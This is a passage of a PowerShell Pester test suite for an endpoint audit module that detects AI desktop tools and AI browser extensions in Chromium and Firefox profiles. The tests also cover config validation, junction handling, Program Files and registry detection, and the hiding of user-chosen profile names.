                    Mock Get-CEProcessList { , $script:testBrowserProcs }
                    Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $S; IsElevated = $E; ConsoleUserSid = 'S-1-5-21-1-2-3-1001' })
                }
            }
            function global:Get-TestBrowserMatch {
                # The collector on its own, for the ids in the current catalog. One output object per match.
                param([string]$ProfilePath)
                InModuleScope CEAudit -Parameters @{ P = $ProfilePath } {
                    param($P)
                    $catalog = Get-CEAIToolCatalog
                    $ids = Get-CEBrowserExtensionIdSet -Catalog $catalog
                    $m = Get-CEBrowserExtensionList -ProfilePath $P -ChromiumIds $ids.Chromium -FirefoxIds $ids.Firefox
                    $m
                }
            }
            function global:Get-TestToolById { param($State, [string]$Id) @($State.Tools | Where-Object { $_.Id -eq $Id }) }
            function global:Set-TestProgramFiles {
                # Program Files as the module sees it: ProgramW6432 is the 64-bit folder in 32-bit and 64-bit
                # processes alike; ProgramFiles is the x86 folder in a 32-bit process.
                param([string]$W6432, [string]$ProgramFiles, [string]$X86)
                foreach ($d in @($W6432, $ProgramFiles, $X86) | Where-Object { $_ }) { New-Item -ItemType Directory -Force -Path $d | Out-Null }
                $env:ProgramW6432 = $W6432
                $env:ProgramFiles = $ProgramFiles
                ${env:ProgramFiles(x86)} = $X86
            }
        }
        BeforeEach {
            # Browsers installed on this machine must not change a result, so Program Files starts empty.
            $global:CEOrigProgramFiles = @{ W6432 = $env:ProgramW6432; Pf = $env:ProgramFiles; X86 = ${env:ProgramFiles(x86)} }
            $none = Join-Path $TestDrive 'no-program-files'
            Set-TestProgramFiles -W6432 $none -ProgramFiles $none -X86 $none
        }
        AfterEach {
            $env:ProgramW6432 = $global:CEOrigProgramFiles.W6432
            $env:ProgramFiles = $global:CEOrigProgramFiles.Pf
            ${env:ProgramFiles(x86)} = $global:CEOrigProgramFiles.X86
            InModuleScope CEAudit -Parameters @{ O = $global:CEOrigBrowserConfig } {
                param($O)
                (Get-CEConfig)['ai-tools'] = $O.Tools
                (Get-CEConfig)['browser-profiles'] = $O.Browsers
                (Get-CEConfig)['ai-approvals'] = $O.Approvals
            }
        }

        It 'the shipped browser profile list is well formed' {
            $list = Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw | ConvertFrom-Json
            $list.lastReviewed | Should -Match '^\d{4}-\d{2}-\d{2}$'
            "$($list.maxProfilesPerBrowser)" | Should -Match '^[1-9]\d*$'
            "$($list.maxEntriesPerFolder)" | Should -Match '^[1-9]\d*$'
            $names = @($list.windows | ForEach-Object { $_.name })
            $names.Count | Should -BeGreaterThan 0
            ($names | Sort-Object -Unique).Count | Should -Be $names.Count
            InModuleScope CEAudit -Parameters @{ L = $list } {
                param($L)
                foreach ($b in @($L.windows)) {
                    [string]$b.engine | Should -BeIn @('chromium', 'firefox') -Because $b.name
                    Test-CERelativePathText ([string]$b.root) | Should -BeTrue -Because "$($b.name) root"
                    $prop = $b.PSObject.Properties['installed']
                    foreach ($i in @(if ($prop -and $null -ne $prop.Value) { $prop.Value })) {
                        if ($i.PSObject.Properties['appx']) { [string]$i.appx | Should -Match '^[A-Za-z0-9][A-Za-z0-9.-]{0,63}$' -Because $b.name; continue }
                        [string]$i.base | Should -BeIn @('programFiles', 'programFilesX86', 'profile') -Because $b.name
                        Test-CERelativePathText ([string]$i.path) | Should -BeTrue -Because "$($b.name) installed path"
                    }
                }
                # The shipped file loads without anything being dropped.
                @((Get-CEBrowserProfileRoot).Browsers).Count | Should -Be @($L.windows).Count
            }
            foreach ($b in @($list.windows)) {
                $prop = $b.PSObject.Properties['installed']
                $inst = @(if ($prop -and $null -ne $prop.Value) { $prop.Value | Where-Object { $_.PSObject.Properties['base'] } })
                # A missing install place makes a live browser look uninstalled, and UA-07 then drops its services.
                foreach ($i in @($inst | Where-Object { $_.base -eq 'programFiles' })) {
                    @($inst | Where-Object { $_.base -eq 'programFilesX86' -and $_.path -eq $i.path }).Count | Should -Be 1 -Because "$($b.name) can also be installed in Program Files (x86)"
                }
            }
            $names | Should -Contain 'Opera Neon Developer'
            # A catalog 'paths' folder must not hold a browser's profiles: they stay after an uninstall, so the
            # browser would still be reported while its extensions say it is not installed.
            $tools = Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw | ConvertFrom-Json
            $roots = @($list.windows | ForEach-Object { ([string]$_.root).ToLowerInvariant() })
            foreach ($t in @($tools.tools)) {
                $w = $t.PSObject.Properties['windows']
                if (-not $w -or $null -eq $w.Value -or -not $w.Value.PSObject.Properties['paths']) { continue }
                foreach ($rel in @($w.Value.paths)) {
                    InModuleScope CEAudit -Parameters @{ R = [string]$rel } { param($R) Test-CERelativePathText $R | Should -BeTrue -Because $R }
                    $l = ([string]$rel).ToLowerInvariant()
                    @($roots | Where-Object { $_ -eq $l -or $_.StartsWith("$l\") }).Count | Should -Be 0 -Because "$($t.id): $rel holds a browser's profiles"
                }
            }
        }

        It 'reads a partial browser-profiles.json override without failing' {
            foreach ($json in '{}', '{ "windows": [] }', '{ "windows": [ { "name": "Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data" } ] }') {
                Set-TestBrowserConfig -Browsers $json
                $r = InModuleScope CEAudit { Get-CEBrowserProfileRoot }
                $r.MaxProfiles | Should -Be 64 -Because $json
                $r.MaxEntries | Should -Be 2000 -Because $json
            }
            @($r.Browsers).Count | Should -Be 1
            # Entries it can't use are dropped, not fatal.
            Set-TestBrowserConfig -Browsers '{ "maxProfilesPerBrowser": "lots", "maxEntriesPerFolder": 99999, "windows": [ { "name": "A", "engine": "gecko", "root": "x" }, { "name": "B", "engine": "chromium", "root": "..\\x" }, { "engine": "chromium", "root": "x" }, { "name": "C", "engine": "chromium", "root": "x", "installed": [ { "base": "windows", "path": "a.exe" }, { "base": "profile", "path": "C:\\a.exe" } ] } ] }'
            $r = InModuleScope CEAudit { Get-CEBrowserProfileRoot }
            @($r.Browsers | ForEach-Object Name) | Should -Be @('C')
            @($r.Browsers[0].Installed).Count | Should -Be 0
            $r.MaxProfiles | Should -Be 64
            $r.MaxEntries | Should -Be 10000
        }

        It 'finds AI browser extensions by folder name in Chromium and Firefox profiles' {
            $p = Join-Path $TestDrive 'bx-profile'
            New-TestTree $p @(
                "$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.99_0",
                "$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.100_0",
                "$CETestChromeData\Work Stuff\Extensions\$($CETestExtId.Claude)\2.0_0",
                "AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$($CETestExtId.ChatGptEdge)\1.26.901.11451_0",
                "AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$($CETestExtId.Other)\1.0_0",
                'AppData\Local\Microsoft\Edge\User Data\Default\Extensions\Temp',
                "AppData\Local\BraveSoftware\Brave-Browser\User Data\$($CETestExtId.ChatGpt)\1.0_0",
                "AppData\Roaming\Opera Software\Opera Stable\Extensions\$($CETestExtId.Claude)\1.0_0",
                'AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.default-release\extensions\support@wordtune.com.xpi',
                'AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.default-release\extensions\x@y.xpix',
                'AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.Paul Work\extensions\support@wordtune.com.xpi')
            # A settings file holding a URL: it must never be opened.
            Set-Content -LiteralPath (Join-Path $p "$CETestChromeData\Profile 1\Preferences") -Value '{ "homepage": "https://secret.example/" }' -Encoding ASCII
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $st = Invoke-TestBrowserScan -ProfilePath $p
            $st.ProfileChecked | Should -BeTrue

            $claude = @(Get-TestToolById $st 't-claude')
            $claude.Count | Should -Be 1
            $claude[0].Signals | Should -Contain "Google Chrome extension: $($CETestExtId.Claude) 1.0.100 (profile: Profile 1)" -Because 'versions are compared as numbers, not by name'
            $claude[0].Signals | Should -Contain "Google Chrome extension: $($CETestExtId.Claude) 2.0 (profile: other)" -Because 'a profile folder name the person chose is never shown'
            $claude[0].Signals | Should -Contain "Opera extension: $($CETestExtId.Claude) 1.0 (profile: main)"
            $claude[0].LeftoverOnly | Should -BeFalse
            $claude[0].CanActOnDevice | Should -BeFalse

            $chatgpt = @(Get-TestToolById $st 't-chatgpt')
            @($chatgpt[0].Signals) | Should -Be @("Microsoft Edge extension: $($CETestExtId.ChatGptEdge) 1.26.901.11451 (profile: Default)") -Because 'a folder named like an id at the Brave root is not a profile'
            $chatgpt[0].Signals.GetType().IsArray | Should -BeTrue -Because 'one signal is still a list on Windows PowerShell 5.1'

            $wordtune = @(Get-TestToolById $st 't-wordtune')
            @($wordtune[0].Signals).Count | Should -Be 2
            @($wordtune[0].Signals) | Should -Contain 'Mozilla Firefox add-on: support@wordtune.com (profile: default-release)'
            @($wordtune[0].Signals) | Should -Contain 'Mozilla Firefox add-on: support@wordtune.com (profile: other)'

            $all = @($st.Tools | ForEach-Object { $_.Signals }) -join "`n"
            $all | Should -Not -Match 'x@y' -Because '*.xpi also matches .xpix on Windows PowerShell 5.1, and that is filtered out'
            $all | Should -Not -Match 'secret\.example'
            $all | Should -Not -Match 'Work Stuff|Paul Work'
            @(Get-TestBrowserMatch $p | Where-Object { $_.Id -eq $CETestExtId.Other }).Count | Should -Be 0 -Because 'only ids in the catalog are returned'
        }

        It 'labels matches from an uninstalled browser as a leftover, and changes the advice' {
            $p = Join-Path $TestDrive 'bx-leftover'
            New-TestTree $p @("$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.94_0")
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers @'
{ "windows": [ { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data",
  "installed": [ { "base": "profile", "path": "AppData\\Local\\Google\\Chrome\\Application\\chrome.exe" } ] } ] }
'@
            $claude = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-claude')
            @($claude[0].Signals) | Should -Be @("Google Chrome extension: $($CETestExtId.Claude) 1.0.94 (profile: Profile 1; leftover: Google Chrome is not installed)")
            $claude[0].LeftoverOnly | Should -BeTrue

            New-TestTree $p @('AppData\Local\Google\Chrome\Application\chrome.exe')
            $claude = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-claude')
            @($claude[0].Signals) | Should -Be @("Google Chrome extension: $($CETestExtId.Claude) 1.0.94 (profile: Profile 1)")
            $claude[0].LeftoverOnly | Should -BeFalse

            $leftover = New-TestAITool 'Old Extension' -Service 'X' -CanAct $false -Id 't-claude'
            $leftover | Add-Member -NotePropertyName LeftoverOnly -NotePropertyValue $true
            Set-TestAITools -Tools @($leftover, (New-TestAITool 'Cursor' -Service 'Cursor'))
            $f = @(Invoke-CEAuditCore -Id 'SC-14' | Where-Object Subject -eq 'Old Extension')
            $f[0].Status | Should -Be 'Warn' -Because 'a leftover changes the advice, not the status'
            $f[0].Recommendation | Should -Match '^Old Extension is only in the profile folder of a browser that is no longer installed\. Delete that folder'
            InModuleScope CEAudit -Parameters @{ D = (Get-Date).Date.AddDays(-5).ToString('yyyy-MM-dd') } {
                param($D)
                (Get-CEConfig)['ai-approvals'] = ("{ `"tools`": [ { `"id`": `"t-claude`", `"decision`": `"not-approved`", `"decidedBy`": `"A. Person`", `"decidedOn`": `"$D`" } ] }" | ConvertFrom-Json)
            }
            $f = @(Invoke-CEAuditCore -Id 'SC-14' | Where-Object Subject -eq 'Old Extension')
            $f[0].Status | Should -Be 'Fail'
            $f[0].Recommendation | Should -Be 'Old Extension is only in the profile folder of a browser that is no longer installed. Delete that folder (see the evidence). If the tool is now needed, change the decision in config/ai-approvals.json instead.'
            $mfa = @(Invoke-CEAuditCore -Id 'UA-07')
            @($mfa | Where-Object Subject -eq 'X').Count | Should -Be 0 -Because 'a leftover profile does not show the service is in use'
            @($mfa | Where-Object Subject -eq 'Cursor').Count | Should -Be 1
        }

        It 'does not call a tool a leftover when it is also found another way or is running' {
            $p = Join-Path $TestDrive 'bx-leftover-both'
            New-TestTree $p @("$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)\1.0.94_0")
            # An override that joins a desktop app with its browser extension; Chrome is not installed.
            Set-TestBrowserConfig -Tools @"
{ "schemaVersion": 2, "tools": [ { "id": "t-both", "name": "Both test", "service": "Both", "canActOnDevice": false,
  "windows": { "paths": [ ".bothtool" ], "processes": [ { "image": "bothtool.exe" } ] },
  "browserExtensions": [ { "store": "chrome", "id": "$($CETestExtId.Claude)" } ] } ] }
"@ -Browsers @'
{ "windows": [ { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data",
  "installed": [ { "base": "profile", "path": "AppData\\Local\\Google\\Chrome\\Application\\chrome.exe" } ] } ] }
'@
            @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-both')[0].LeftoverOnly | Should -BeTrue -Because 'the extension is its only signal'

            $run = [pscustomobject]@{ Name = 'bothtool.exe'; ProcessId = 4242; Path = 'C:\Apps\bothtool.exe'; CommandLine = 'bothtool'; Cim = $null }
            $both = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Processes @($run)) 't-both')
            $both[0].LeftoverOnly | Should -BeFalse -Because 'the tool is running'
            $both[0].Signals | Should -Contain 'Running: bothtool.exe (pid 4242)'

            New-TestTree $p @('.bothtool')
            $both = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 't-both')
            $both[0].LeftoverOnly | Should -BeFalse -Because 'its profile folder is there too'
            $both[0].Signals | Should -Contain 'Found %USERPROFILE%\.bothtool'
        }

        It 'the browser extension collector reads folder and file names only' {
            InModuleScope CEAudit {
                $names = 'Get-CEBrowserExtensionList', 'Get-CEPlainChildName', 'Get-CEChromiumExtensionVersion', 'Test-CEPlainDirectory', 'Test-CEPlainDirectoryChain',
                    'Test-CERelativePathText', 'Get-CEBrowserProfileLabel', 'Get-CEBrowserExtensionIdSet', 'Test-CEFirefoxAddonId', 'Test-CEBrowserInstalled',
                    'Get-CEBrowserProfileRoot', 'Format-CEBrowserExtensionEvidence', 'ConvertTo-CEBoundedInt', 'Test-CEPlainProfileItem', 'Get-CEProgramFilesPath',
                    'Test-CELinkItem', 'Get-CEReparseTag'
                $text = @($names | ForEach-Object { (Get-Command $_ -CommandType Function).ScriptBlock.ToString() }) -join "`n"
                $text | Should -Not -Match 'Get-Content|ReadAll|OpenRead|OpenText|OpenWrite|StreamReader|FileStream|\.Open\(|ConvertFrom-Json|Import-Csv|Select-String|Get-Item|Get-ChildItem|Test-Path|Resolve-Path|Registry|Invoke-CENative|Invoke-Expression|Start-Process|-Recurse|\[IO\.File\]|&\s*\$'
                # Listings stay lazy: routing the enumerable through an 'if' expression would read the whole folder first.
                $list = (Get-Command Get-CEPlainChildName -CommandType Function).ScriptBlock.ToString()
                $list | Should -Match '\$items = \$di\.EnumerateFiles'
                $list | Should -Match '\$items = \$di\.EnumerateDirectories'
                $list | Should -Not -Match '=\s*if\s*\('
            }
        }

        It 'does not follow junctions below the profile while looking for browser extensions' {
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $links = New-Object System.Collections.ArrayList
            try {
                $ext = "Extensions\$($CETestExtId.Claude)\1.0_0"
                $case = {
                    # A profile, a target outside it holding a Chrome extension, and the link between them.
                    param([string]$Name, [string]$Plain, [string]$Link, [string]$TargetTree)
                    $root = Join-Path $TestDrive "bx-junction-$Name"
                    New-TestTree (Join-Path $root 'profile') @($Plain)
                    New-TestTree (Join-Path $root 'target') @($TargetTree)
                    $l = Join-Path (Join-Path $root 'profile') $Link
                    New-Item -ItemType Junction -Path $l -Target (Join-Path $root 'target') | Out-Null
                    [void]$links.Add($l)
                    return (Join-Path $root 'profile')
                }
                $cases = @{
                    'a profile'          = & $case 'a' "$CETestChromeData\Profile 1" "$CETestChromeData\Profile 2" $ext
                    'the browser folder' = & $case 'b' 'AppData\Local\Google' 'AppData\Local\Google\Chrome' "User Data\Profile 1\$ext"
                    'Extensions'         = & $case 'c' "$CETestChromeData\Profile 1" "$CETestChromeData\Profile 1\Extensions" "$($CETestExtId.Claude)\1.0_0"
                    'an extension'       = & $case 'd' "$CETestChromeData\Profile 1\Extensions" "$CETestChromeData\Profile 1\Extensions\$($CETestExtId.Claude)" '1.0_0'
                }
                foreach ($k in $cases.Keys) {
                    @(Get-TestBrowserMatch $cases[$k]).Count | Should -Be 0 -Because "$k is a junction"
                }
                # The profile folder itself may be a link (profile containers, moved profiles): that one is followed.
                $real = Join-Path $TestDrive 'bx-junction-e\real'
                New-TestTree $real @("$CETestChromeData\Profile 1\$ext")
                $viaLink = Join-Path $TestDrive 'bx-junction-e\profile'
                New-Item -ItemType Junction -Path $viaLink -Target $real | Out-Null
                [void]$links.Add($viaLink)
                $m = @(Get-TestBrowserMatch $viaLink)
                $m.Count | Should -Be 1
                $m[0].Profile | Should -Be 'Profile 1'
            }
            finally {
                # Remove the links themselves, never what they point to.
                foreach ($l in $links) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It 'looks for browser extensions through a cloud-synced folder, a reparse point that is not a link' {
            # Every folder under a OneDrive or Proton Drive sync root is a reparse point with a cloud tag.
            # A test can't make one, so junctions stand in for them, with Get-CEReparseTag giving their tag.
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers $CETestBrowsers
            $root = Join-Path $TestDrive 'bx-cloudfolder'
            $p = Join-Path $root 'profile'
            New-TestTree $p @('AppData\Local\Google')
            New-TestTree (Join-Path $root 'chrome') @("User Data\Profile 1\Extensions\$($CETestExtId.Claude)\1.0_0")
            New-TestTree (Join-Path $root 'profile2') @("Extensions\$($CETestExtId.Claude)\2.0_0")
            $chrome = Join-Path $p 'AppData\Local\Google\Chrome'
            $profile2 = Join-Path $root 'chrome\User Data\Profile 2'
            New-Item -ItemType Junction -Path $chrome -Target (Join-Path $root 'chrome') | Out-Null
            New-Item -ItemType Junction -Path $profile2 -Target (Join-Path $root 'profile2') | Out-Null
            try {
                $global:CETestReparseTag = [Convert]::ToInt64('9000601A', 16)
                Mock -ModuleName CEAudit Get-CEReparseTag { $global:CETestReparseTag }
                $claude = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Elevated) 't-claude')
                $claude.Count | Should -Be 1
                @($claude[0].Signals | Sort-Object) | Should -Be @(
                    "Google Chrome extension: $($CETestExtId.Claude) 1.0 (profile: Profile 1)",
                    "Google Chrome extension: $($CETestExtId.Claude) 2.0 (profile: Profile 2)")
                # The same folders as real junctions are not followed.
                $global:CETestReparseTag = [Convert]::ToInt64('A0000003', 16)
                @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Elevated) 't-claude').Count | Should -Be 0
            }
            finally {
                Remove-Variable -Name CETestReparseTag -Scope Global -ErrorAction SilentlyContinue
                foreach ($l in @($profile2, $chrome)) { if ([IO.Directory]::Exists($l)) { [IO.Directory]::Delete($l) } }
            }
        }

        It 'knows a browser is installed from Program Files and Program Files (x86)' {
            $p = Join-Path $TestDrive 'bx-programfiles'
            New-TestTree $p @("$CETestChromeData\Default\Extensions\$($CETestExtId.Claude)\1.0_0",
                "AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions\$($CETestExtId.ChatGpt)\1.0_0",
                "AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$($CETestExtId.ChatGptEdge)\1.0_0")
            $pf = Join-Path $TestDrive 'bx-pf'
            $pfx = Join-Path $TestDrive 'bx-pfx86'
            New-TestTree $pf @('Google\Chrome\Application\chrome.exe')
            New-TestTree $pfx @('BraveSoftware\Brave-Browser\Application\brave.exe')
            Set-TestBrowserConfig -Tools $CETestExtTools -Browsers @'
{ "windows": [
  { "name": "Google Chrome", "engine": "chromium", "root": "AppData\\Local\\Google\\Chrome\\User Data", "installed": [ { "base": "programFiles", "path": "Google\\Chrome\\Application\\chrome.exe" } ] },
  { "name": "Brave", "engine": "chromium", "root": "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data", "installed": [ { "base": "programFiles", "path": "BraveSoftware\\Brave-Browser\\Application\\brave.exe" }, { "base": "programFilesX86", "path": "BraveSoftware\\Brave-Browser\\Application\\brave.exe" } ] },
  { "name": "Microsoft Edge", "engine": "chromium", "root": "AppData\\Local\\Microsoft\\Edge\\User Data", "installed": [ { "base": "programFiles", "path": "Microsoft\\Edge\\Application\\msedge.exe" }, { "base": "programFilesX86", "path": "Microsoft\\Edge\\Application\\msedge.exe" } ] }
] }
'@
            Set-TestProgramFiles -W6432 $pf -ProgramFiles $pf -X86 $pfx
            $m = @(Get-TestBrowserMatch $p)
            $found = @{}
            foreach ($x in $m) { $found[$x.Browser] = $x.BrowserFound }
            $found['Google Chrome'] | Should -BeTrue -Because 'chrome.exe is in Program Files'
            $found['Brave'] | Should -BeTrue -Because 'brave.exe is in Program Files (x86)'
            $found['Microsoft Edge'] | Should -BeFalse -Because 'msedge.exe is in neither'

            # In a 32-bit PowerShell, ProgramFiles names the x86 folder; the 64-bit one is still looked in.
            Set-TestProgramFiles -W6432 $pf -ProgramFiles $pfx -X86 $pfx
            $m = @(Get-TestBrowserMatch $p)
            @($m | Where-Object { $_.Browser -eq 'Google Chrome' })[0].BrowserFound | Should -BeTrue -Because 'a 32-bit host still finds 64-bit Chrome'
            InModuleScope CEAudit -Parameters @{ Pf = $pf; Pfx = $pfx } {
                param($Pf, $Pfx)
                Get-CEProgramFilesPath 'programFiles' | Should -Be $Pf
                Get-CEProgramFilesPath 'programFilesX86' | Should -Be $Pfx
                Get-CEProgramFilesPath 'profile' | Should -Be ''
                $env:ProgramW6432 = $null
                Get-CEProgramFilesPath 'programFiles' | Should -Be $Pfx -Because 'without ProgramW6432 (32-bit Windows) ProgramFiles is used'
            }
        }

        It 'knows Firefox is installed when only Developer Edition or Nightly is' {
            # Every Firefox edition keeps its profiles in the same folder, so an add-on in a Developer Edition
            # profile must not be called a leftover of release Firefox.
            $p = Join-Path $TestDrive 'bx-firefox-dev'
            New-TestTree $p @('AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.dev-edition-default\extensions\support@wordtune.com.xpi')
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 'wordtune-extension')
            $tool[0].LeftoverOnly | Should -BeTrue -Because 'no Firefox edition is installed yet'

            $cases = @{
                'Developer Edition in Program Files'         = @{ Base = 'W6432'; Path = 'Firefox Developer Edition\firefox.exe' }
                'Nightly in Program Files (x86)'             = @{ Base = 'X86'; Path = 'Firefox Nightly\firefox.exe' }
                'an older Nightly in Program Files'          = @{ Base = 'W6432'; Path = 'Nightly\firefox.exe' }
                'Developer Edition installed for one person' = @{ Base = 'Profile'; Path = 'AppData\Local\Firefox Developer Edition\firefox.exe' }
            }
            $i = 0
            foreach ($k in $cases.Keys) {
                $i++
                $pf = Join-Path $TestDrive "bx-ff-pf$i"
                $pfx = Join-Path $TestDrive "bx-ff-pfx$i"
                Set-TestProgramFiles -W6432 $pf -ProgramFiles $pf -X86 $pfx
                $q = Join-Path $TestDrive "bx-ff-profile$i"
                New-TestTree $q @('AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.dev-edition-default\extensions\support@wordtune.com.xpi')
                $base = switch ($cases[$k].Base) { 'W6432' { $pf } 'X86' { $pfx } default { $q } }
                New-TestTree $base @($cases[$k].Path)
                $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $q) 'wordtune-extension')
                $tool[0].LeftoverOnly | Should -BeFalse -Because $k
                @($tool[0].Signals) | Should -Be @('Mozilla Firefox add-on: support@wordtune.com (profile: dev-edition-default)') -Because $k
            }
        }

        It 'knows Firefox from the Microsoft Store is installed when it uses the usual profile folder' {
            # The Store app keeps its profiles in %APPDATA%\Mozilla\Firefox and has no firefox.exe in Program Files.
            $p = Join-Path $TestDrive 'bx-firefox-store'
            New-TestTree $p @('AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.default-release\extensions\support@wordtune.com.xpi')
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p) 'wordtune-extension')
            $tool[0].LeftoverOnly | Should -BeTrue -Because 'no Firefox is installed'
            $tool = @(Get-TestToolById (Invoke-TestBrowserScan -ProfilePath $p -Store 'Mozilla.Firefox') 'wordtune-extension')
            $tool[0].LeftoverOnly | Should -BeFalse -Because 'the Store package Mozilla.Firefox is installed for the user'
            @($tool[0].Signals) | Should -Be @('Mozilla Firefox add-on: support@wordtune.com (profile: default-release)')
            # Store package names in browser-profiles.json are checked.
            Set-TestBrowserConfig -Browsers '{ "windows": [ { "name": "X", "engine": "firefox", "root": "A", "installed": [ { "appx": "Mozilla.Firefox" }, { "appx": "../evil" }, { "appx": "a b" } ] } ] }'
            InModuleScope CEAudit {
                $b = @((Get-CEBrowserProfileRoot).Browsers)
                @($b[0].Installed | ForEach-Object { "$($_.Base):$($_.Path)" }) | Should -Be @('appx:Mozilla.Firefox')
                Test-CEBrowserInstalled -Browser $b[0] -ProfilePath 'C:\nobody' -StorePackages @('Other.App') | Should -BeFalse
                Test-CEBrowserInstalled -Browser $b[0] -ProfilePath 'C:\nobody' -StorePackages @('Other.App', 'Mozilla.Firefox') | Should -BeTrue
            }
        }

        It 'reads installed programs from the 64-bit and 32-bit registry views whatever the PowerShell' {
            # A 32-bit PowerShell sees HKLM:\SOFTWARE as WOW6432Node, so reading it by path misses 64-bit programs.
            InModuleScope CEAudit {
                (Get-Command Get-CEUninstallRegistryEntry -CommandType Function).ScriptBlock.ToString() | Should -Match 'OpenBaseKey' -Because 'the view is opened explicitly, not through the redirected HKLM: drive'
                Mock Get-CEUninstallRegistryEntry {
                    if ($View -eq 'Registry64') { , @([pscustomobject]@{ PSChildName = 'Opera Neon 1.0'; DisplayName = 'Opera Neon 1.0'; DisplayVersion = '1.0'; Publisher = 'Opera Software' }) }
                    else { , @([pscustomobject]@{ PSChildName = '{X}'; DisplayName = 'Old 32-bit tool'; Publisher = 'X' }, [pscustomobject]@{ PSChildName = 'hidden'; DisplayName = 'Hidden'; SystemComponent = 1 }) }
                }
                Mock Get-CEUserRegistryRoot { $null }
                @(Get-CEInstalledSoftware | ForEach-Object { $_.Name }) | Should -Be @('Old 32-bit tool', 'Opera Neon 1.0')
                Should -Invoke Get-CEUninstallRegistryEntry -Times 1 -Exactly -ParameterFilter { $View -eq 'Registry64' }
                Should -Invoke Get-CEUninstallRegistryEntry -Times 1 -Exactly -ParameterFilter { $View -eq 'Registry32' }
            }
        }

        It 'skips an Uninstall subkey it may not read and keeps reading the ones after it' {
            InModuleScope CEAudit {
                (Get-Command Get-CEUninstallRegistryEntry -CommandType Function).ScriptBlock.ToString() | Should -Match 'ConvertFrom-CEUninstallKey'
                # RegistryKey.OpenSubKey throws SecurityException for a key whose ACL denies this account.
                $key = [pscustomobject]@{ Names = @('A', 'Denied', 'Gone', 'BadValue', 'B') }
                $key | Add-Member -MemberType ScriptMethod -Name GetSubKeyNames -Value { $this.Names }
                $key | Add-Member -MemberType ScriptMethod -Name OpenSubKey -Value {
                    param($n)
                    if ($n -eq 'Denied') { throw (New-Object System.Security.SecurityException 'Requested registry access is not allowed.') }
                    if ($n -eq 'Gone') { return $null }
                    $sub = [pscustomobject]@{ N = $n }
                    $sub | Add-Member -MemberType ScriptMethod -Name GetValue -Value {
                        param($v)
                        if ($this.N -eq 'BadValue') { throw (New-Object System.UnauthorizedAccessException 'denied') }
                        if ($v -eq 'DisplayName') { "App $($this.N)" }
                    }
                    $sub | Add-Member -MemberType ScriptMethod -Name Close -Value { }
                    $sub
                }
                $entries = ConvertFrom-CEUninstallKey -Key $key -View 'Registry64'
                @($entries | ForEach-Object { $_.DisplayName }) | Should -Be @('App A', 'App B')
                @($entries | ForEach-Object { $_.PSChildName }) | Should -Be @('A', 'B')
            }
        }

        It 'does not report Comet or Genspark from the profiles they leave behind when uninstalled' {
            $p = Join-Path $TestDrive 'bx-comet'
            New-TestTree $p @("AppData\Local\Perplexity\Comet\User Data\Default\Extensions\$($CETestExtId.Claude)\1.0.94_0",
                'AppData\Local\GensparkSoftware\Genspark-Browser\User Data\Default')
            # The shipped files, read directly so an admin's copy on this machine doesn't change the result,
            # and Program Files is empty (BeforeEach), so a Comet installed on this machine doesn't either.
            Set-TestBrowserConfig -Tools (Get-Content (Join-Path $script:RepoRoot 'config\ai-tools.json') -Raw) -Browsers (Get-Content (Join-Path $script:RepoRoot 'config\browser-profiles.json') -Raw)
            $st = Invoke-TestBrowserScan -ProfilePath $p
            @(Get-TestToolById $st 'perplexity-comet').Count | Should -Be 0 -Because 'Comet is not installed'
            @(Get-TestToolById $st 'genspark-browser').Count | Should -Be 0 -Because 'Genspark is not installed'
            $claude = @(Get-TestToolById $st 'claude-in-chrome')
            $claude[0].LeftoverOnly | Should -BeTrue
            @($claude[0].Signals) | Should -Be @("Comet extension: $($CETestExtId.Claude) 1.0.94 (profile: Default; leftover: Comet is not installed)")

            New-TestTree $p @('AppData\Local\Perplexity\Comet\Application\comet.exe')
            $st = Invoke-TestBrowserScan -ProfilePath $p
            @(Get-TestToolById $st 'perplexity-comet')[0].Signals | Should -Contain 'Found %USERPROFILE%\AppData\Local\Perplexity\Comet\Application'
